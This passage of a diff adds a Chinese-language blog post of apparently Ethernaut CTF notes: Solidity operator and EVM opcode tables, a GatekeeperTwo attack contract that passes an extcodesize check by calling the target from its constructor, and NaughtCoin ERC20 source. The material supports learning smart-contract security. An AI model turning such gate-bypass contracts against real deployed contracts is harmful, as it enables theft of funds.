+<td align="center">Function-like call</td>
+<td align="center"><code>&lt;func&gt;(&lt;args...&gt;)</code></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">Parentheses</td>
+<td align="center"><code>(&lt;statement&gt;)</code></td>
+</tr>
+<tr>
+<td align="center"><em>2</em></td>
+<td align="center">Prefix increment and decrement</td>
+<td align="center"><code>++</code>, <code>--</code></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">Unary plus and minus</td>
+<td align="center"><code>+</code>, <code>-</code></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">Unary operations</td>
+<td align="center"><code>delete</code></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">Logical NOT</td>
+<td align="center"><code>!</code></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">Bitwise NOT</td>
+<td align="center"><code>~</code></td>
+</tr>
+<tr>
+<td align="center"><em>3</em></td>
+<td align="center">Exponentiation</td>
+<td align="center"><code>**</code></td>
+</tr>
+<tr>
+<td align="center"><em>4</em></td>
+<td align="center">Multiplication, division and modulo</td>
+<td align="center"><code>*</code>, <code>/</code>, <code>%</code></td>
+</tr>
+<tr>
+<td align="center"><em>5</em></td>
+<td align="center">Addition and subtraction</td>
+<td align="center"><code>+</code>, <code>-</code></td>
+</tr>
+<tr>
+<td align="center"><em>6</em></td>
+<td align="center">Bitwise shift operators</td>
+<td align="center"><code>&lt;&lt;</code>, <code>&gt;&gt;</code></td>
+</tr>
+<tr>
+<td align="center"><em>7</em></td>
+<td align="center">Bitwise AND</td>
+<td align="center"><code>&amp;</code></td>
+</tr>
+<tr>
+<td align="center"><em>8</em></td>
+<td align="center">Bitwise XOR</td>
+<td align="center"><code>^</code></td>
+</tr>
+<tr>
+<td align="center"><em>9</em></td>
+<td align="center">Bitwise OR</td>
+<td align="center">&#96;</td>
+</tr>
+<tr>
+<td align="center"><em>10</em></td>
+<td align="center">Inequality operators</td>
+<td align="center"><code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code></td>
+</tr>
+<tr>
+<td align="center"><em>11</em></td>
+<td align="center">Equality operators</td>
+<td align="center"><code>==</code>, <code>!=</code></td>
+</tr>
+<tr>
+<td align="center"><em>12</em></td>
+<td align="center">Logical AND</td>
+<td align="center"><code>&amp;&amp;</code></td>
+</tr>
+<tr>
+<td align="center"><em>13</em></td>
+<td align="center">Logical OR</td>
+<td align="center">&#96;</td>
+</tr>
+<tr>
+<td align="center"><em>14</em></td>
+<td align="center">Ternary operator</td>
+<td align="center"><code>&lt;conditional&gt; ? &lt;if-true&gt; : &lt;if-false&gt;</code></td>
+</tr>
+<tr>
+<td align="center"><em>15</em></td>
+<td align="center">Assignment operators</td>
+<td align="center"><code>=</code>, &#96;</td>
+</tr>
+<tr>
+<td align="center"><em>16</em></td>
+<td align="center">Comma operator</td>
+<td align="center"><code>,</code></td>
+</tr>
+</tbody></table>
+<p><strong>assembly学习</strong></p>
+<table>
+<thead>
+<tr>
+<th>操作码</th>
+<th align="center">标记</th>
+<th align="right">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>stop</td>
+<td align="center">-</td>
+<td align="right">停止执行，相当于返回（0,0)</td>
+</tr>
+<tr>
+<td>add(x,y)</td>
+<td align="center"></td>
+<td align="right">x + y</td>
+</tr>
+<tr>
+<td>sub(x,y)</td>
+<td align="center"></td>
+<td align="right">x - y</td>
+</tr>
+<tr>
+<td>mul(x,y)</td>
+<td align="center"></td>
+<td align="right">x * y</td>
+</tr>
+<tr>
+<td>div(x,y)</td>
+<td align="center"></td>
+<td align="right">x &#x2F; y</td>
+</tr>
+<tr>
+<td>sdiv(x,y)</td>
+<td align="center"></td>
+<td align="right">x &#x2F; y ,对于有符号数，用补码</td>
+</tr>
+<tr>
+<td>mod(x,y)</td>
+<td align="center"></td>
+<td align="right">x % y</td>
+</tr>
+<tr>
+<td>smod(x,y)</td>
+<td align="center"></td>
+<td align="right">x % y,对于有符号数，用补码</td>
+</tr>
+<tr>
+<td>exp(x,y)</td>
+<td align="center"></td>
+<td align="right">x的y次方</td>
+</tr>
+<tr>
+<td>not(x)</td>
+<td align="center"></td>
+<td align="right">～x，按位取反</td>
+</tr>
+<tr>
+<td>lt(x,y)</td>
+<td align="center"></td>
+<td align="right">如果x &lt; y,返回1，否则返回0</td>
+</tr>
+<tr>
+<td>gt(x,y)</td>
+<td align="center"></td>
+<td align="right">如果x &gt; y,返回1，否则返回0</td>
+</tr>
+<tr>
+<td>slt(x,y)</td>
+<td align="center"></td>
+<td align="right">如果x &lt; y,返回1，否则返回0,对于有符号数，用补码</td>
+</tr>
+<tr>
+<td>sgt(x,y)</td>
+<td align="center"></td>
+<td align="right">如果x &gt; y,返回1，否则返回0,对于有符号数，用补码</td>
+</tr>
+<tr>
+<td>eq(x,y)</td>
+<td align="center"></td>
+<td align="right">如果x &#x3D;&#x3D; y,返回1，否则返回0</td>
+</tr>
+<tr>
+<td>iszero(x)</td>
+<td align="center"></td>
+<td align="right">如果x &#x3D;&#x3D; 0,返回1，否则返回0</td>
+</tr>
+<tr>
+<td>and(x,y)</td>
+<td align="center"></td>
+<td align="right">x和y按位与</td>
+</tr>
+<tr>
+<td>or(x,y)</td>
+<td align="center"></td>
+<td align="right">x和y按位或</td>
+</tr>
+<tr>
+<td>xor(x,y)</td>
+<td align="center"></td>
+<td align="right">x和y按位异或</td>
+</tr>
+<tr>
+<td>byte(n,x)</td>
+<td align="center"></td>
+<td align="right">x的第n位，最重要的是第0位</td>
+</tr>
+<tr>
+<td>addmod(x,y,m)</td>
+<td align="center"></td>
+<td align="right">(x + y) % m，可以是任意精度的算术</td>
+</tr>
+<tr>
+<td>mulmod(x,y,m)</td>
+<td align="center"></td>
+<td align="right">(x * y) % m，可以是任意精度的算术</td>
+</tr>
+<tr>
+<td>signxtend(i,x)</td>
+<td align="center"></td>
+<td align="right">从第（i * 8 +  7）位开始数最少签名位数，来扩展签名</td>
+</tr>
+<tr>
+<td>keccak256(p,n)</td>
+<td align="center"></td>
+<td align="right">keccak(mem[p…(p+n)))</td>
+</tr>
+<tr>
+<td>sha3(p,n)</td>
+<td align="center"></td>
+<td align="right">sha3(mem[p…(p+n)))</td>
+</tr>
+<tr>
+<td>jump(label)</td>
+<td align="center">-</td>
+<td align="right">跳转到label标签／代码位置</td>
+</tr>
+<tr>
+<td>jumpi(label, cond)</td>
+<td align="center">-</td>
+<td align="right">如果cond非零，就跳转到label标签</td>
+</tr>
+<tr>
+<td>pc</td>
+<td align="center"></td>
+<td align="right">代码的当前位置</td>
+</tr>
+<tr>
+<td>pop(x)</td>
+<td align="center">-</td>
+<td align="right">删除x推入的元素</td>
+</tr>
+<tr>
+<td>dup1 … dup16</td>
+<td align="center"></td>
+<td align="right">拷贝第i位的元素到栈顶（从顶端开始数）</td>
+</tr>
+<tr>
+<td>swap1 … swap16</td>
+<td align="center">*</td>
+<td align="right">交换栈顶和第i位的元素</td>
+</tr>
+<tr>
+<td>mload（p）</td>
+<td align="center"></td>
+<td align="right">mem[p..(p+32))</td>
+</tr>
+<tr>
+<td>mstore(p, v)</td>
+<td align="center">-</td>
+<td align="right">mem[p..(p+32)) :&#x3D; v</td>
+</tr>
+<tr>
+<td>mstore8(p, v)</td>
+<td align="center">-</td>
+<td align="right">mem[p] :&#x3D; v &amp; 0xff - 只分配一个字节</td>
+</tr>
+<tr>
+<td>sload(p)</td>
+<td align="center"></td>
+<td align="right">storage[p]</td>
+</tr>
+<tr>
+<td>sstore(p, v)</td>
+<td align="center">-</td>
+<td align="right">storage[p] :&#x3D; v</td>
+</tr>
+<tr>
+<td>msize</td>
+<td align="center"></td>
+<td align="right">内存的大小，例如最大的内存可访问索引</td>
+</tr>
+<tr>
+<td>gas</td>
+<td align="center"></td>
+<td align="right">可用的gas数</td>
+</tr>
+<tr>
+<td>address</td>
+<td align="center"></td>
+<td align="right">当前合约／执行上下文的地址</td>
+</tr>
+<tr>
+<td>balance(a)</td>
+<td align="center"></td>
+<td align="right">地址a的余额，单位为wei</td>
+</tr>
+<tr>
+<td>caller</td>
+<td align="center"></td>
+<td align="right">调用者（不包含delegatecall）</td>
+</tr>
+<tr>
+<td>callvalue</td>
+<td align="center"></td>
+<td align="right">当前调用发送的wei数</td>
+</tr>
+<tr>
+<td>calldataload(p)</td>
+<td align="center"></td>
+<td align="right">从位置p开始的调用数据（32位）</td>
+</tr>
+<tr>
+<td>calldatasize</td>
+<td align="center"></td>
+<td align="right">调用数据的大小，bytes为单位</td>
+</tr>
+<tr>
+<td>calldatacopy(t,f,s)</td>
+<td align="center">-</td>
+<td align="right">从数据位置f，拷贝s位数据，到内存位置t</td>
+</tr>
+<tr>
+<td>codesize</td>
+<td align="center"></td>
+<td align="right">当前合约&#x2F;执行上下文的代码大小</td>
+</tr>
+<tr>
+<td>codecopy(t,f,s)</td>
+<td align="center">-</td>
+<td align="right">从代码位置f，拷贝s位数据，到内存位置t</td>
+</tr>
+<tr>
+<td>extcodesize(a)</td>
+<td align="center"></td>
+<td align="right">地址a处代码的大小</td>
+</tr>
+<tr>
+<td>extcodecopy(a, t, f, s)</td>
+<td align="center">-</td>
+<td align="right">像codecopy(t,f,s)，但是是位置a处的代码</td>
+</tr>
+<tr>
+<td>returndatasize</td>
+<td align="center"></td>
+<td align="right">上个返回值的数据大小</td>
+</tr>
+<tr>
+<td>returndatacopy(t, f, s)</td>
+<td align="center">-</td>
+<td align="right">在返回数据的位置f拷贝s位，到内存位置t</td>
+</tr>
+<tr>
+<td>create(v, p, s)</td>
+<td align="center"></td>
+<td align="right">用 mem[p..(p+s))长度的代码，创建一个新的合约，发送v wei的以太币，并返回合约地址</td>
+</tr>
+<tr>
+<td>create2(v, n, p, s)</td>
+<td align="center"></td>
+<td align="right">用 地址为keccak256(&lt; address &gt; . n . keccak256(mem[p..(p+s)))，mem[p..(p+s))长度的代码，创建一个新的合约，发送v wei的以太币，并返回合约地址</td>
+</tr>
+<tr>
+<td>call(g, a, v, in, insize, out, outsize)</td>
+<td align="center"></td>
+<td align="right">调用地址a上的合约，参数为mem[in..(in+insize))，提供g的gas，v wei的以太币，输出到mem[out..(out+outsize))，如果成功返回1，失败（例如gas不足）返回0</td>
+</tr>
+<tr>
+<td>callcode(g, a, v, in, insize, out, outsize)</td>
+<td align="center"></td>
+<td align="right">与<em>call</em>相同，但是使用a处的代码，并只能在当前合约的上下文中执行</td>
+</tr>
+<tr>
+<td>delegatecall(g, a, in, insize, out, outsize)</td>
+<td align="center"></td>
+<td align="right">与<em>callcode</em>相同，但是保留<code>caller</code>和<code>callvalue</code></td>
+</tr>
+<tr>
+<td>staticcall(g, a, in, insize, out, outsize)</td>
+<td align="center"></td>
+<td align="right">与_call(g, a, 0, in, insize, out, outsize) _相同，但是不允许改变状态</td>
+</tr>
+<tr>
+<td>return(p, s)</td>
+<td align="center">-</td>
+<td align="right">结束执行，返回数据mem[p..(p+s))</td>
+</tr>
+<tr>
+<td>revert(p, s)</td>
+<td align="center">-</td>
+<td align="right">结束执行，恢复状态变化，返回数据mem[p..(p+s))</td>
+</tr>
+<tr>
+<td>selfdestruct(a)</td>
+<td align="center">-</td>
+<td align="right">结束执行，销毁当前合约，并把余额发送给a地址</td>
+</tr>
+<tr>
+<td>invalid</td>
+<td align="center">-</td>
+<td align="right">用invalid指令结束执行</td>
+</tr>
+<tr>
+<td>log0(p,s)</td>
+<td align="center">-</td>
+<td align="right">记录日志，不包含主题，数据为mem[p..(p+s)</td>
+</tr>
+<tr>
+<td>log1(p,s,t1)</td>
+<td align="center">-</td>
+<td align="right">记录日志，包含主题t1，数据为mem[p..(p+s)</td>
+</tr>
+<tr>
+<td>log2(p,s,t1,t2)</td>
+<td align="center">-</td>
+<td align="right">记录日志，包含主题t1，t2，数据为mem[p..(p+s)</td>
+</tr>
+<tr>
+<td>log3(p,s,t1,t2,t3)</td>
+<td align="center">-</td>
+<td align="right">记录日志，包含主题t1，t2，t3，数据为mem[p..(p+s)</td>
+</tr>
+<tr>
+<td>log4(p,s,t1,t2,t3,t4)</td>
+<td align="center">-</td>
+<td align="right">记录日志，包含主题t1，t2，t3，t4，数据为mem[p..(p+s)</td>
+</tr>
+<tr>
+<td>origin</td>
+<td align="center"></td>
+<td align="right">交易发起方</td>
+</tr>
+<tr>
+<td>gasprice</td>
+<td align="center"></td>
+<td align="right">交易的gas价格</td>
+</tr>
+<tr>
+<td>blockhash(b)</td>
+<td align="center"></td>
+<td align="right">区块序列为b的hash - 只能获取到当前块的最近256块</td>
+</tr>
+<tr>
+<td>coinbase</td>
+<td align="center"></td>
+<td align="right">当前的矿工收益</td>
+</tr>
+<tr>
+<td>timestamp</td>
+<td align="center"></td>
+<td align="right">自创世纪区块以来的时间戳，单位为秒</td>
+</tr>
+<tr>
+<td>number</td>
+<td align="center"></td>
+<td align="right">当前区块的序号</td>
+</tr>
+<tr>
+<td>difficulty</td>
+<td align="center"></td>
+<td align="right">当前区块的难度</td>
+</tr>
+<tr>
+<td>gaslimit</td>
+<td align="center"></td>
+<td align="right">当前代码块的gas限制</td>
+</tr>
+</tbody></table>
+<p>学习到extcodesize(caller())是一种检验合约地址还是账户地址的操作，如果caller为账户则extcodesize(caller())为0，如果caller为合约则extcodesize(caller())为对应的字节码，如下为测试合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract test&#123;</span><br><span class="line">    </span><br><span class="line">    function a() public view returns(uint )&#123;</span><br><span class="line">        uint x;</span><br><span class="line">   assembly &#123; </span><br><span class="line">       x := extcodesize(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4)</span><br><span class="line">   &#125;</span><br><span class="line">   return x;</span><br><span class="line">    &#125;</span><br><span class="line">    function b() public view returns(uint)&#123;</span><br><span class="line">        uint y;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            y:=extcodesize(0x4a9C121080f6D9250Fc0143f41B595fD172E31bf)</span><br><span class="line">        &#125;</span><br><span class="line">        return y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试结果为如下</p>
+<p><img src="http://www.lzhnb.site/png/21.png" alt="image-20220124231908138"></p>
+<p>&#x3D;&#x3D;<strong>进一步了解得知：合约在初始化，代码大小为0。即需要将攻击过程写在constuctor中</strong>&#x3D;&#x3D;</p>
+<h2 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    GatekeeperTwo public target=GatekeeperTwo(0xfD6a4183eed0115CBe743c480eA4042C15F0a86c);</span><br><span class="line">    bytes8 public result;</span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        result = bytes8(0xffffffffffffffff ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));</span><br><span class="line">        target.enter(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-Naught-Coin"><a href="#5-Naught-Coin" class="headerlink" title="5.Naught Coin"></a>5.Naught Coin</h1><p>题目要求：NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p>
+<p> Things that might help</p>
+<ul>
+<li>The <a target="_blank" rel="noopener" href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> Spec</li>
+<li>The <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts">OpenZeppelin</a> codebase</li>
+</ul>
+<h2 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">  // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">  // uint public constant decimals = 18;</span><br><span class="line">  uint public timeLock = now + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;)</span><br><span class="line">  public &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">    // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender == player) &#123;</span><br><span class="line">      require(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><strong>erc20.sol</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./IERC20.sol&quot;;</span><br><span class="line">import &quot;./extensions/IERC20Metadata.sol&quot;;</span><br><span class="line">import &quot;../../utils/Context.sol&quot;;</span><br><span class="line">contract ERC20 is Context, IERC20, IERC20Metadata &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">    string private _name;</span><br><span class="line">    string private _symbol;</span><br><span class="line">    constructor(string memory name_, string memory symbol_) &#123;</span><br><span class="line">        _name = name_;</span><br><span class="line">        _symbol = symbol_;</span><br><span class="line">    &#125;</span><br><span class="line">    function name() public view virtual override returns (string memory) &#123;</span><br><span class="line">        return _name;</span><br><span class="line">    &#125;</span><br><span class="line">    function symbol() public view virtual override returns (string memory) &#123;</span><br><span class="line">        return _symbol;</span><br><span class="line">    &#125;</span><br><span class="line">    function decimals() public view virtual override returns (uint8) &#123;</span><br><span class="line">        return 18;</span><br><span class="line">    &#125;</span><br><span class="line">    function totalSupply() public view virtual override returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line">    function balanceOf(address account) public view virtual override returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer(address recipient, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        _transfer(_msgSender(), recipient, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line">    function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        _approve(_msgSender(), spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        uint256 currentAllowance = _allowances[sender][_msgSender()];</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;= amount, &quot;ERC20: transfer amount exceeds allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(sender, _msgSender(), currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        _transfer(sender, recipient, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;</span><br><span class="line">        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;</span><br><span class="line">        uint256 currentAllowance = _allowances[_msgSender()][spender];</span><br><span class="line">        require(currentAllowance &gt;= subtractedValue, &quot;ERC20: decreased allowance below zero&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(_msgSender(), spender, currentAllowance - subtractedValue);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function _transfer(address sender,address recipient,uint256 amount) internal virtual &#123;</span><br><span class="line">        require(sender != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(recipient != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(sender, recipient, amount);</span><br><span class="line"></span><br><span class="line">        uint256 senderBalance = _balances[sender];</span><br><span class="line">        require(senderBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[sender] = senderBalance - amount;</span><br><span class="line">        &#125;</span><br><span class="line">        _balances[recipient] += amount;</span><br><span class="line"></span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(sender, recipient, amount);</span><br><span class="line">    &#125;</span><br><span class="line">    function _mint(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">        _totalSupply += amount;</span><br><span class="line">        _balances[account] += amount;</span><br><span class="line">        emit Transfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(address(0), account, amount);</span><br><span class="line">    &#125;</span><br><span class="line">    function _burn(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: burn from the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(account, address(0), amount);</span><br><span class="line"></span><br><span class="line">        uint256 accountBalance = _balances[account];</span><br><span class="line">        require(accountBalance &gt;= amount, &quot;ERC20: burn amount exceeds balance&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[account] = accountBalance - amount;</span><br><span class="line">        &#125;</span><br><span class="line">        _totalSupply -= amount;</span><br><span class="line"></span><br><span class="line">        emit Transfer(account, address(0), amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(account, address(0), amount);</span><br><span class="line">    &#125;</span><br><span class="line">    function _approve(address owner,address spender,uint256 amount) internal virtual &#123;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">        emit Approval(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">    function _beforeTokenTransfer(address from,address to,uint256 amount) internal virtual &#123;&#125;</span><br><span class="line">    function _afterTokenTransfer(address from,address to,uint256 amount) internal virtual &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-3"><a href="#Analyze-3" class="headerlink" title="Analyze"></a>Analyze</h2><p>主要是考察了erc20，之前有过一些了解</p>
+<p>学习到了solidity中super的含义，指的是调用继承合约中的函数，如下为测试合约（可供更好的理解super）&#x3D;&#x3D;<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43377336/article/details/88418062">学习链接</a>&#x3D;&#x3D;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.5;</span><br><span class="line">contract C &#123;</span><br><span class="line">     uint u;</span><br><span class="line">     function f() &#123;</span><br><span class="line">       u = 1;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract B is C &#123;</span><br><span class="line">     function f() &#123;</span><br><span class="line">       u = 2;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract A is B &#123;</span><br><span class="line">     function f() &#123;  // will set u to 3</span><br><span class="line">       u = 3;</span><br><span class="line">     &#125;</span><br><span class="line">     function f1() &#123; // will set u to 2</span><br><span class="line">       